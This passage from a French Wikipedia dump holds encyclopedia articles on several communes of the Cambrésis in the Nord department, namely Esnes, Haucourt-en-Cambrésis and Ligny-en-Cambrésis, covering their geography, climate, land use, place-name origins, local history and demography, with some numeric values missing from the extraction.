L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (90 % en 2018), une proportion sensiblement équivalente à celle de 1990 (90,2 %). La répartition détaillée en 2018 est la suivante : 
terres arables (77,9 %), prairies (11,6 %), zones urbanisées (6,3 %), forêts (3,7 %), zones agricoles hétérogènes (0,6 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le village est mentionné au long des sous les noms "Hunlini Curtis" en 1046, .
De nombreux noms de communes du Cambrésis (et du nord de la France jusqu'à la Normandie) sont terminés par l'appellatif toponymique "-court". Cet appellatif est issu du bas latin ou plutôt du gallo-roman , du bas latin "cōrtem" (&gt; ancien français "cort, curt" &gt; français "cour", le "-t" ayant été supprimé par fausse étymologie par le latin "curia", contrairement au dérivé "courtois"), qui désigne un domaine rural ou un enclos autour d'une habitation et qui a été utilisé par les Germains, notamment les Francs, à l'époque de leur installation en Gaule antérieurement à "-ville".
Selon Albert Dauzat qui se fonde sur la forme de 1046, "Hunlini" représente le nom de personne germanique "Hunila".
Histoire.
Jacques de Hamel Bellenglise, fils d'Antoine, seigneur d'Élincourt épouse en 1508 Marie de Boubers, fille de Jean et de Simone de Rambures. Un de leurs descendants à trois ou quatre générations est Charles de Hamel Bellenglise, mort en 1630, marié à Jeanne des Acharts de Vallobres. Ces derniers ont eu une fille unique Anne Claire Eugénie Élisabeth, héritière de la branche aînée de la maison et mariée en 1645 à Antoine de La Viefville, marquis d'Orvilles ou d'Orvillers, député de la noblesse de Picardie aux États généraux du royaume.
Politique et administration.
Politique locale.
De à , 5 conseillers municipaux démissionnent en raison de désaccords avec le maire, amenant à des élections municipales complémentaires le chargées d'élire leurs successeurs. Le conseil redevenu complet aura à élire ou réélire le maire.
Liste des maires.
Maire en 1802-1803 : Pierre Sarazin.
Maire en 1807 : Decaudin.
Maire en 1808 : Duprez.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,9 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 23,4 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,64 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191900" url="https://fr.wikipedia.org/wiki?curid=191900" title="Grim Edit">
Grim Edit



</doc>
<doc id="191901" url="https://fr.wikipedia.org/wiki?curid=191901" title="Esnes (Nord)">
Esnes (Nord)

Esnes est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Géographie.
Localisation.
Esnes est un village du Cambrésis situé à 10 minutes de Caudry et de Cambrai.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Torrent d'Esnes et le ruisseau de Sargrenon.
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Esnes est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Cambrai, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (92,1 % en 2018), une proportion identique à celle de 1990 (92,1 %). La répartition détaillée en 2018 est la suivante : 
terres arables (82,4 %), prairies (8 %), forêts (5,3 %), zones urbanisées (2,6 %), zones agricoles hétérogènes (1,6 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Habitat et logement.
En 2020, le nombre total de logements dans la commune était de 297, alors qu'il était de 293 en 2015 et de 288 en 2010.
Parmi ces logements, 90,9 % étaient des résidences principales, 1,7 % des résidences secondaires et 7,4 % des logements vacants. Ces logements étaient pour 98,3 % d'entre eux des maisons individuelles et pour 1,7 % des appartements.
Le tableau ci-dessous présente la typologie des logements à Esnes en 2020 en comparaison avec celle du Nord et de la France entière. Une caractéristique marquante du parc de logements est ainsi une proportion de résidences secondaires et logements occasionnels (1,7 %) égale à celle du département (1,7 %) et inférieure à celle de la France entière (9,7 %). Concernant le statut d'occupation de ces logements, 77 % des habitants de la commune sont propriétaires de leur logement (77,4 % en 2015), contre 54,5 % pour le Nord et 57,5 pour la France entière.
Voies de communication et transports.
La commune est desservie par le réseau de transports urbains de la Communauté d'agglomération de Cambrai appelé TUC (Transports Urbains du Cambrésis), par la ligne 12.
Toponymie.
Le village est mentionné au long des sous les noms "Esna", "Aesna", "Aina", "Aisna", "Aignes", "Ayne", "Aisne", "Asne", "Haynes" et "Aysnes". Selon Mannier et Boniface le nom, qu'ils rapprochent de celui de l'Aisne, vient de racines (roman "aigne", celte "aen" ou "aon", "ayen" ou "ayon")) qui désignent un cours d'eau.
Histoire.
Préhistoire.
Des haches en pierre taillée du Paléolithique ont été retrouvées sur le territoire communal, matérialisant l'existence d'une communauté humaine dans la vallée de l'Esnelle, il y a plus de 12000 ans. Des haches en pierre polie indiquent que le site est toujours peuplé vers 5000 ans avant J.C..
Moyen Âge.
Esnes était l'une des douze .
Le premier seigneur connu à Esnes est Alard de Peteghem en 1007, il est pair du Cambrésis.
Quatre générations plus tard, Alard II (1105) a comme héritière une fille qui épouse Eustache de Landas, seigneur d'Eyne en Flandre, quatrième fils d'Amaury et d'Ermentrude de Béthune. La maison d'Esnes passe donc dans une branche de la famille de Landas, qu'on appellera les Landas d'Esnes. Ils porteront les armes anciennes, c'est-à-dire d'argent (blanc) à la bordure de sable (noir).
Une église dépendant de l'Abbaye Saint-Aubert de Cambrai est mentionnée en 1133. A cette même date, la localité se voit accorder une charte communale
Vers 1260, Alix de Beauvoir, épouse de Gérard de Landas d'Esnes, accouche d'une unique fille, Alix, qui épouse Alard de Croisille, dont les armes sont de gueules (rouge) à 10 losanges d'or (jaune) placés 3,3,3,1. Celui-ci fait passer la maison des Landas-Esnes dans sa famille, et n'étant pas l'aîné, il décide de reprendre le nom d'Esnes. Pour confirmer cette nouvelle dénomination, il maintient son blason mais en prenant les couleurs des Landas-Esnes. Ses nouvelles armes sont donc de sable (noir) à 10 losanges d'argent (blanc) qui deviennent définitivement les armes des seigneurs d'Esnes.
Les seigneurs d'Esnes rendent pour la plupart hommage au comte de Hainaut et font partie de cette armée dans les différentes campagnes contre le duché de Brabant, de Limbourg, de Flandre etc. Pourtant Jean au début de la guerre de Cent Ans renvoie son hommage au comte de Hainaut, allié aux Anglais, pour servir le roi de France. Il est tué à la bataille de Poitiers en 1358.
Le château est reconstruit au mais est très rapidement dépassé par l'évolution des armements militaires et la localité, également frappée par les famines, épidémies de peste, jacqueries et diverses guerres, voit son importance diminuer.
Plusieurs seigneurs d'Esnes sont baillis du Cambrésis et d'Amiens. Robert d'Esnes dit Mansart en 1411, homme du duc d'Orléans, seigneur d'Esnes, de Grécourt, Wavrechin, Vire, Bétancourt et Beauvoir est gouverneur du château de Coucy qu'il défend pendant 3 mois, assiégé par le comte de Saint-Pol. Il se rend après bien des combats faute de vivres.
Sausset d'Esne, combat et trouve la mort à la bataille d'Azincourt en 1415.
Temps modernes.
Au , on signale Jean de Beaufremez, chevalier, baron d'Esne, seigneur de Staples, Sporrewarde, etc., bailli du Cambrésis, époux de Catherine de Heuchin. Lui succède son fils Adrien de Beaufremez, seigneur des mêmes lieux, pair du Cambrésis, époux de Catherine de Berch, fille de Jean de Bergh, écuyer, seigneur de Planques. La terre d'Esnes est érigée pour lui en baronnie par lettres de Sa Majesté Chrétienne du 13 septembre 1650.
Par lettres patentes de Louis XV de février 1723, la baronnie d'Esnes, avec les terres de Caurois et Brimeux, est érigée en marquisat sous le nom de Bauffremez en faveur de Charles-Alexandre de Bauffremez.
Époque contemporaine.
Durant la Première Guerre mondiale, Esnes est occupée par les troupes allemandes le 26 août 1914 après la défaite des alliés lors de la Bataille du Cateau. Le combat de Longsart oppose ce jour-là la 4e division britannique à la 1ère armée allemande, dans le cadre de la contre-offensive allemande lancée depuis Le Cateau. Cette résistance alliée favorise un meilleur repli de l'armée britannique, dans le cadre de la contre-offensive de la bataille de la Marne.
Le village reste ensuite loin des combats jusqu'au date à laquelle le village est pris par les troupes australiennes.
Politique et administration.
Rattachements administratifs et électoraux.
Rattachements administratifs.
La commune se trouve dans l'arrondissement de Cambrai du département du Nord.
Elle faisait partie depuis 1801 du canton de Clary. Dans le cadre du redécoupage cantonal de 2014 en France, cette circonscription administrative territoriale a disparu, et le canton n'est plus qu'une circonscription électorale.
Rattachements électoraux.
Pour les élections départementales, la commune fait partie depuis 2014 du canton du Cateau-Cambrésis
Pour l'élection des députés, elle fait partie de la dix-huitième circonscription du Nord.
Intercommunalité.
Esnes était membre de la communauté de communes de l'Espace Sud Cambrésis, un établissement public de coopération intercommunale (EPCI) à fiscalité propre créé fin 1993 et auquel la commune avait transféré un certain nombre de ses compétences, dans les conditions déterminées par le code général des collectivités territoriales.
Conformément aux prescriptions de la loi de réforme des collectivités territoriales du , qui a prévu le renforcement et la simplification des intercommunalités et la constitution de structures intercommunales de grande taille, cette intercommunalité a fusionné avec sa voisine pour former, le , la communauté d'agglomération du Caudrésis - Catésis, mais Esnes préfère rejoindre la communauté d'agglomération de Cambrai (CAC) dont elle est désormais membre.
Jumelage.
Ce jumelage lie deux localités distantes de , mais qui avaient le même seigneur, la famille des Landas-Esnes, et partagent le même blason.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 36,5 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 27,6 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,15 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191903" url="https://fr.wikipedia.org/wiki?curid=191903" title="Haucourt-en-Cambrésis">
Haucourt-en-Cambrésis

Haucourt-en-Cambrésis est une commune française, située dans le département du Nord en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Torrent d'Esnes et.
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Haucourt-en-Cambrésis est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Cambrai, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (100 % en 2018), une proportion identique à celle de 1990 (100 %). La répartition détaillée en 2018 est la suivante : 
terres arables (91,5 %), zones agricoles hétérogènes (8,5 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
"Hulcurt" (1133), "Hucurt" (1177), "Holcurt" (1180), "Howecort" (1208).
D'après Ernest Nègre, le nom de Haucourt viendrait d'un anthroponyme germanique, "Hugolus".
Histoire.
La villae romaine "alti corte" existe depuis le haut Moyen Âge. Cette fut habitée de façon épisodique par les comtes d'Ardennegau (Comté d'Ardenne), roitelets Germains s'étant soumis aux Romains dont ils sont devenus les auxiliaires militaires, ainsi la dynastie des Brunulfs, issue de Walbert roi des Sugambres (Sicambres) d'Ardennes.
La paroisse de Haucourt est érigée en 1227, la même année que la paroisse de Haplincourt. Elle fait partie du diocèse de Cambrai.
Les seigneurs de la Maison de Haucourt sont issus de celle de Walincourt.
De la Maison de Haucourt sont extraites les Maisons de Grébert et de Louvignies.
Thomas de Haucourt a combattu et trouvé la mort à la bataille d'Azincourt en 1415.
Une des six éoliennes du parc éolien du Bois de Saint-Aubert est mise en service en 2024 sur le finage de Haucourt-en-Cambrésis.
Politique et administration.
Maire de 1802 à 1808 : J. B. Legrand.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 30,3 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 26,8 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,28 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191904" url="https://fr.wikipedia.org/wiki?curid=191904" title="Ligny-en-Cambrésis">
Ligny-en-Cambrésis

Ligny-en-Cambrésis est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Ses habitants sont appelés les "Lignysiens". Le nom jeté des habitants de Ligny est les "Leus" (les Loups).
Géographie.
Localisation.
Ligny-en-Cambrésis est située à à vol d'oiseau au sud-ouest de Caudry, dans le sud du département du Nord. Le Cateau-Cambrésis est à , Cambrai à et Lille, la capitale régionale, à .
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Torrent d'Esnes, le ruisseau d'Iris, le Hameau et le Riot des Quarante.
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Voies de communication et transports.
Ligny-en-Cambrésis est au croisement des routes départementales D15 et D16. La commune est desservie par deux lignes du réseau CambrésiX, groupement composé de six entreprises de transport locales, vers Caudry et Villers-Outréaux d'une part, Cambrai et Élincourt d'autre part.
La gare SNCF la plus proche est à Caudry.
Urbanisme.
Typologie.
Au , Ligny-en-Cambrésis est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (88,3 % en 2018), en diminution par rapport à 1990 (91 %). La répartition détaillée en 2018 est la suivante : 
terres arables (87 %), zones urbanisées (11,7 %), prairies (1,3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Logement.
En 2008, Ligny-en-Cambrésis comptait , auxquelles s'ajoutaient vacants, soit 9 % du total, et 10 résidences secondaires ou logements occasionnels. Les maisons représentaient 98,5 % de l'ensemble des logements, pourcentage pratiquement identique au recensement de 1999 (98,7 %) et nettement supérieur à celui observé dans le département du Nord (68,6 %).
La part de résidences principales datant d'avant 1949 s'élevait à 70,9 %. Pour les constructions plus récentes, 16,6 % des logements dataient d'entre 1949 et 1974 et 12,5 % d'après 1975.
Toponymie.
Ligny dériverait selon Eugène Mannier de "Liniacum". Comme c'est le cas de nombreuses localités, le suffixe celtique « -iacum » ou « -iaco » (plus tard évoluant en « -y »), a été accolé à un nom propre, celui du propriétaire du domaine. Le village est ainsi mentionné en 878 sous le nom de "Liniacum", puis en 1046 comme "Lineium", en 1174 comme "Lengni", en 1204 comme "Lengniacum".
Ligny est devenu Ligny-en-Cambrésis en 1894, puis Ligny-Haucourt en 1972 après la fusion avec Haucourt-en-Cambrésis, et a repris son nom en 1997 lors de la séparation des deux communes.
Histoire.
Antiquité et Moyen Âge.
La localité appartenait, à l'époque gallo-romaine, à la cité des Nerviens, dont la première capitale fut Bavay, remplacée au par Cambrai. Il est possible qu'une villa gallo-romaine, propriété d'un Licinius qui serait à l'origine du nom de la localité, ait occupé le site du château érigé au Moyen Âge.
Le village est mentionné à la fin du par le cartulaire de l'église de Cambrai. C'est de cette époque que datent les premiers remparts du château. En 1046, l'église de Ligny, ecclesia de Lineio, fut concédée par l'évêque de Cambrai Gérard à l'Abbaye Saint-André du Cateau.
En 1286, Mathieu de Ligny accorde une loi aux habitants de Ligny.
Époques modernes et contemporaines.
Le les Français de la garnison de Cambrai s'emparent du château propriété de la famille de Villers-au-Tertre, une branche de la maison de Wavrin, du parti de l'Espagne. Le c'est le gouverneur de Cambrai Balagny se rend maître du château ainsi que de 120 prisonniers.
Les Villers-au-Tertre restent seigneurs du village jusqu'à la Révolution française.
Le village a longtemps vécu non seulement de l'agriculture, mais aussi du tissage à domicile de toiles de lin, pratiqué par les mulquiniers dans leur cave pour l'humidité nécessaire au travail de ce fil. Cette activité a aujourd'hui disparu, remplacée aux par des ateliers textiles eux-mêmes fermés pour la plupart.
En 1793 la commune de Ligny a été rattachée au département du Nord, au district de Cambrai et au canton de Walincourt, puis, en 1801, au canton de Clary.
Durant la Première Guerre mondiale, Cambrai est occupée. La bataille de Cambrai se déroule à une vingtaine de kilomètres à l'ouest.
La zone est à nouveau occupée durant la Seconde Guerre mondiale.
Politique et administration.
Administration municipale.
La commune ayant entre 1500 et en 2008 le nombre de conseillers municipaux est de 19. Depuis 2008 le maire est Michèle Brulant.
Ligny est membre de la communauté de communes du Caudrésis - Catésis, qui comprend 46 communes et .
Liste des maires.
Maire en 1802-1803 : Albert Villers.
Maire en 1807-1808 : Devillers (la même personne qu'en 1802-1803?).
Tendances politiques et résultats.
Au premier tour de l'élection présidentielle de 2012, les quatre candidats arrivés en tête à Ligny sont Marine Le Pen (FN, 28,65 %), François Hollande (PS, 25,88 %), Nicolas Sarkozy (UMP, 24,86 %) et Jean-Luc Mélenchon (Front de gauche, 9,70 %) avec un taux de participation de 83,97 %. Au deuxième tour François Hollande arrive en tête avec 50,20 % des voix, pour un taux de participation de 82,06 %.
Au deuxième tour des élections régionales de 2010, 50,15 % des suffrages exprimés sont allés à la liste conduite par Daniel Percheron (PS), 23,68 % à celle de Valérie Létard (UMP), et 26,16 % à la liste FN de Marine Le Pen, pour un taux de participation de 53,12 %.
Aux élections européennes de 2009, les deux meilleurs scores à Ligny-en-Cambrésis étaient ceux de la liste du Parti socialiste conduite par Gilles Pargneaux, qui a obtenu soit 22,36 % des suffrages exprimés (département du Nord 19,55 %), et de la liste de la majorité présidentielle conduite par Dominique Riquet, qui a obtenu soit 20,53 % des suffrages exprimés (département du Nord 24,57 %) pour un taux de participation de 40,81 %.
Au deuxième tour de l'élection présidentielle de 2007, 54,55 % des électeurs ont voté pour Nicolas Sarkozy (UMP), et 45,45 % pour Ségolène Royal (PS), avec un taux de participation de 86,41 %.
Au deuxième tour des élections législatives de 2007, 51,25 % des électeurs de Ligny-en-Cambrésis ont voté pour François-Xavier Villain (UMP) (57,45 % dans la du Nord), 48,75 % pour Brigitte Douay (PS) (42,55 % dans la circonscription), avec un taux de participation de 65,42 % à Ligny-en-Cambrésis et de 60,08 % dans la circonscription.
Instances judiciaires et administratives.
La commune de Ligny-en-Cambrésis est dans le ressort de la cour d'appel de Douai, du tribunal d'instance, du tribunal de grande instance, du tribunal pour enfants et du conseil de prud'hommes de Cambrai, du tribunal de commerce de Douai, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Politique environnementale.
La protection et la mise en valeur de l'environnement font partie des compétences de la communauté de communes du Caudrésis - Catésis. Ses « brigades vertes » interviennent sur le territoire de l'ensemble des communes pour la création et l'entretien des espaces verts, l'aménagement de l'espace rural, les plantations et l'abattage d'arbres.
Jumelages.
Au , Ligny n'est jumelée avec aucune autre commune.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,6 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 20,7 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,4 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
La commune gère une école maternelle et une école publique de neuf classes rattachée au secteur du collège François-Villon de Walincourt-Selvigny dans la circonscription de Cambrai-sud et l'académie de Lille.
Santé.
En 2012 Ligny-en-Cambrésis compte deux médecins généralistes, une infirmière et une pharmacie. L'hôpital le plus proche est celui de Cambrai.
Cultes.
Les Lignysiens disposent d'un lieu de culte catholique : l'église Saint-Martin. Cette église dépend du « relais des cinq clochers » de la paroisse « Sainte-Anne-en-Cambrésis » rattachée à l'archidiocèse de Cambrai.
Économie.
Revenus de la population et fiscalité.
En 2009, le revenu fiscal médian par ménage était de , ce qui plaçait Ligny-en-Cambrésis au rang parmi les communes de plus de 50 ménages en métropole.
Emploi.
Ligny-en-Cambrésis se trouve dans le bassin d'emploi du Cambrésis. L'agence Pôle emploi pour la recherche d'emploi la plus proche est localisée à Caudry.
En 2008, la population de Ligny-en-Cambrésis se répartissait ainsi : 72,6 % d'actifs, ce qui est légèrement supérieur aux 71,6 % d'actifs de la moyenne nationale et 7,3 % de retraités, un chiffre inférieur au taux national de 8,5 %. Le taux de chômage était de 9 % contre 12,5 % en 1999.
Entreprises et commerces.
Au , Ligny-en-Cambrésis comptait 96 établissements.
Répartition des établissements par domaines d'activité au 
Culture et patrimoine.
Monuments et lieux historiques.
Le château de Ligny, situé au centre du village, date de l'époque médiévale. Ses premières fortifications remontent probablement au . Une grosse tour ronde en pierre blanche est le seul vestige subsistant des constructions du Moyen Âge. Au le château était l'un des plus importants du Cambrésis, et ses seigneurs y battaient monnaie. En 1581, les Français de la garnison de Cambrai s'en emparent et le confisquent à ses seigneurs, les Villers-au-Tertre, du parti des Espagnols. Le château est remanié au par cette même famille : le portail d'entrée en grès date de 1635. Après d'importants travaux de restauration en 1996 le château abrite un hôtel quatre étoiles et un restaurant gastronomique.
La brasserie Pattyn, fondée de source orale au , est reprise après la Première Guerre mondiale par deux brasseurs de Quiévy. À partir de 1925 la « brasserie de Ligny » fabrique du malt et de la bière, le « bock des Leus ». En 1927 la production s'élevait à de bière de fermentation haute. Interrompue par la Deuxième Guerre mondiale, la production reprend vers 1946, avec de bière de fermentation mixte et se poursuit jusqu'en 1963. L'usine est convertie en dépôt de boissons, puis en dépôt de charbon. Les bâtiments sont inscrits à l'inventaire des monuments historiques depuis le .
Ligny-en-Cambrésis communal cemetery est un cimetière militaire britannique géré par la "Commonwealth War Graves Commission".

</doc>
<doc id="191905" url="https://fr.wikipedia.org/wiki?curid=191905" title="Malincourt">
Malincourt

Malincourt est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau de Sargrenon et le Malincourt.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
